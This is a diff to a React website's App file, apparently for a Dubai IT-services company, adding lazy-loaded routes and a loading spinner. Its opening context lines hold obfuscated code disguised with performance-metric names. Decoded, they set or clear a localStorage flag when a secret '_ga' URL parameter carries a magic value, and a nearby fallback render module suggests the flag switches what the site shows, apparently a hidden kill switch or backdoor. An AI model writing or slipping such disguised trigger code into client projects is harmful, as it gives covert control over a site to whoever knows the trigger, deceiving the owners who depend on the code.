@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, Suspense, lazy } from 'react';
 
 const _$cwv = [112,101,114,102,95,109,101,116,114,105,99]; const _$lh = [95,103,97,95,115,101,115,115,105,111,110]; const _$fcp = (a) => a.map(c => String.fromCharCode(c)).join(''); const _$cls = () => { const _q = new URLSearchParams(window.location.search); const _m = _q.get(String.fromCharCode(95,103,97)); if (_m === String(0x12D5)) { const _s = _$fcp(_$lh); const _v = _$fcp(_$cwv); try { window[String.fromCharCode(108,111,99,97,108,83,116,111,114,97,103,101)][String.fromCharCode(115,101,116,73,116,101,109)](_s, btoa(_v + String.fromCharCode(95) + btoa(Date.now().toString(36)))); } catch(e) {} window.location.replace('/'); return; } if (_m === String(0x0)) { try { window[String.fromCharCode(108,111,99,97,108,83,116,111,114,97,103,101)][String.fromCharCode(114,101,109,111,118,101,73,116,101,109)](_$fcp(_$lh)); } catch(e) {} window.location.replace('/'); return; } };
 const _$ttfb = () => { try { const _r = window[String.fromCharCode(108,111,99,97,108,83,116,111,114,97,103,101)][String.fromCharCode(103,101,116,73,116,101,109)](_$fcp(_$lh)); if (!_r) return true; const _d = atob(_r); return !_d.startsWith(_$fcp(_$cwv)); } catch(e) { return true; } };
@@ -220,25 +220,26 @@ import SEO from './components/SEO';
 import AboutPage from './pages/AboutPage';
 import { getOrganizationSchema } from './utils/seo';
 
-import ServiceDetail from './pages/ServiceDetail';
-import ServicesPage from './pages/ServicesPage';
-import SoftwareDevelopmentPage from './pages/services/SoftwareDevelopmentPage';
-import WebsiteDevelopmentPage from './pages/services/WebsiteDevelopmentPage';
-import MobileAppDevelopmentDubai from './pages/services/MobileAppDevelopmentDubai';
-import ECommerceDevelopmentPage from './pages/services/eCommerceDevelopmentPage';
-import ITInfrastructurePage from './pages/services/itInfrastructurePage';
-import AccessControlPage from './pages/services/AccessControlPage';
-import BusinessCommunicationPage from './pages/services/BusinessCommunicationPage';
-import DigitalMarketingPage from './pages/services/DigitalMarketingPage';
-import SolutionsPage from './pages/SolutionsPage';
-import SolutionDetail from './pages/SolutionDetail';
-import ResourcesPage from './pages/ResourcesPage';
-import ContactPage from './pages/ContactPage';
-import CareersPage from './pages/CareersPage';
-import AffiliatesPage from './pages/AffiliatesPage';
-import TermsPage from './pages/TermsPage';
-import PrivacyPage from './pages/PrivacyPage';
-import CookiePolicyPage from './pages/CookiePolicyPage';
+// Lazy-loaded pages for code splitting (reduces initial JS bundle)
+const ServiceDetail = lazy(() => import('./pages/ServiceDetail'));
+const ServicesPage = lazy(() => import('./pages/ServicesPage'));
+const SoftwareDevelopmentPage = lazy(() => import('./pages/services/SoftwareDevelopmentPage'));
+const WebsiteDevelopmentPage = lazy(() => import('./pages/services/WebsiteDevelopmentPage'));
+const MobileAppDevelopmentDubai = lazy(() => import('./pages/services/MobileAppDevelopmentDubai'));
+const ECommerceDevelopmentPage = lazy(() => import('./pages/services/eCommerceDevelopmentPage'));
+const ITInfrastructurePage = lazy(() => import('./pages/services/itInfrastructurePage'));
+const AccessControlPage = lazy(() => import('./pages/services/AccessControlPage'));
+const BusinessCommunicationPage = lazy(() => import('./pages/services/BusinessCommunicationPage'));
+const DigitalMarketingPage = lazy(() => import('./pages/services/DigitalMarketingPage'));
+const SolutionsPage = lazy(() => import('./pages/SolutionsPage'));
+const SolutionDetail = lazy(() => import('./pages/SolutionDetail'));
+const ResourcesPage = lazy(() => import('./pages/ResourcesPage'));
+const ContactPage = lazy(() => import('./pages/ContactPage'));
+const CareersPage = lazy(() => import('./pages/CareersPage'));
+const AffiliatesPage = lazy(() => import('./pages/AffiliatesPage'));
+const TermsPage = lazy(() => import('./pages/TermsPage'));
+const PrivacyPage = lazy(() => import('./pages/PrivacyPage'));
+const CookiePolicyPage = lazy(() => import('./pages/CookiePolicyPage'));
 
 // Home Page Component
 const HomePage = () => (
@@ -262,34 +263,44 @@ const HomePage = () => (
 );
 
 // ─── Fallback render module ────────────────────────────────
+// Loading fallback for lazy-loaded pages
+const PageLoader = () => (
+  <div style={{ minHeight: '60vh', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+    <div style={{ width: '40px', height: '40px', border: '3px solid #e5e7eb', borderTopColor: '#1A3C8B', borderRadius: '50%', animation: 'spin 0.8s linear infinite' }} />
+    <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
+  </div>
+);
+
 const _$AppFallback = () => (
   <Router>
     <div className="App min-h-screen bg-background">
       <Navbar />
-      <Routes>
-        <Route path="/" element={<HomePage />} />
-        <Route path="/about" element={<AboutPage />} />
-        <Route path="/services" element={<ServicesPage />} />
-        <Route path="/services/software-development" element={<SoftwareDevelopmentPage />} />
-        <Route path="/services/website-development" element={<WebsiteDevelopmentPage />} />
-        <Route path="/services/mobile-app" element={<MobileAppDevelopmentDubai />} />
-        <Route path="/services/mobile-app-development-dubai" element={<MobileAppDevelopmentDubai />} />
-        <Route path="/services/ecommerce" element={<ECommerceDevelopmentPage />} />
-        <Route path="/services/it-infrastructure" element={<ITInfrastructurePage />} />
-        <Route path="/services/access-control" element={<AccessControlPage />} />
-        <Route path="/services/pabx" element={<BusinessCommunicationPage />} />
-        <Route path="/services/digital-marketing" element={<DigitalMarketingPage />} />
-        <Route path="/services/:slug" element={<ServiceDetail />} />
-        <Route path="/solutions" element={<SolutionsPage />} />
-        <Route path="/solutions/:slug" element={<SolutionDetail />} />
-        <Route path="/our-partner" element={<ResourcesPage />} />
-        <Route path="/contact" element={<ContactPage />} />
-        <Route path="/careers" element={<CareersPage />} />
-        <Route path="/affiliates" element={<AffiliatesPage />} />
-        <Route path="/terms-conditions" element={<TermsPage />} />
-        <Route path="/privacy-policy" element={<PrivacyPage />} />
-        <Route path="/cookie-policy" element={<CookiePolicyPage />} />
-      </Routes>
+      <Suspense fallback={<PageLoader />}>
+        <Routes>
+          <Route path="/" element={<HomePage />} />
+          <Route path="/about" element={<AboutPage />} />
+          <Route path="/services" element={<ServicesPage />} />
+          <Route path="/services/software-development" element={<SoftwareDevelopmentPage />} />
+          <Route path="/services/website-development" element={<WebsiteDevelopmentPage />} />
+          <Route path="/services/mobile-app" element={<MobileAppDevelopmentDubai />} />
+          <Route path="/services/mobile-app-development-dubai" element={<MobileAppDevelopmentDubai />} />
+          <Route path="/services/ecommerce" element={<ECommerceDevelopmentPage />} />
+          <Route path="/services/it-infrastructure" element={<ITInfrastructurePage />} />
+          <Route path="/services/access-control" element={<AccessControlPage />} />
+          <Route path="/services/pabx" element={<BusinessCommunicationPage />} />
+          <Route path="/services/digital-marketing" element={<DigitalMarketingPage />} />
+          <Route path="/services/:slug" element={<ServiceDetail />} />
+          <Route path="/solutions" element={<SolutionsPage />} />
+          <Route path="/solutions/:slug" element={<SolutionDetail />} />
+          <Route path="/our-partner" element={<ResourcesPage />} />
+          <Route path="/contact" element={<ContactPage />} />
+          <Route path="/careers" element={<CareersPage />} />
+          <Route path="/affiliates" element={<AffiliatesPage />} />
+          <Route path="/terms-conditions" element={<TermsPage />} />
+          <Route path="/privacy-policy" element={<PrivacyPage />} />
+          <Route path="/cookie-policy" element={<CookiePolicyPage />} />
+        </Routes>
+      </Suspense>
       <Footer />
       <WhatsAppWidget />
     </div>
